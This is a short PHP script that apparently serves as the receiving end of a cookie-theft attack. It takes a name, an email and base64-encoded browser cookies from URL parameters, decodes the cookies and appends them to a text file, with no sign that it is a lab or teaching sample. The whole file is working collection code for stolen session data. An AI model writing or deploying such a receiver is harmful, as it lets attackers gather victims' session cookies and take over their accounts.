<?php
$username = $_GET["name"];
$email = $_GET["email"];

$cookies = $_GET["cookies"];
$cookies = base64_decode($cookies);
echo "Cookies: " . $cookies . "\n";

/*echo "\n decoded: " . base64_decode($cookies) . "\n";

if(base64_decode($cookies) == false) {
    echo "Cookie isn't base64 encoded.\n" . $cookies;
    exit(0);
}

echo "Cookies: " . $cookies;
*/

if($cookies && $username && $email) {
    $cookie_file = "cookies.txt";
    $cookie_handle = fopen($cookie_file, "a");

    //Strip newlines because I am lazy and throwing everything in a flat file
    fwrite($cookie_handle, trim($username, "\n") . "\n" . trim($email, "\n") . "\n" . trim($cookies, "\n") . "\n\n");

    fclose($cookie_handle);
    
}
?>
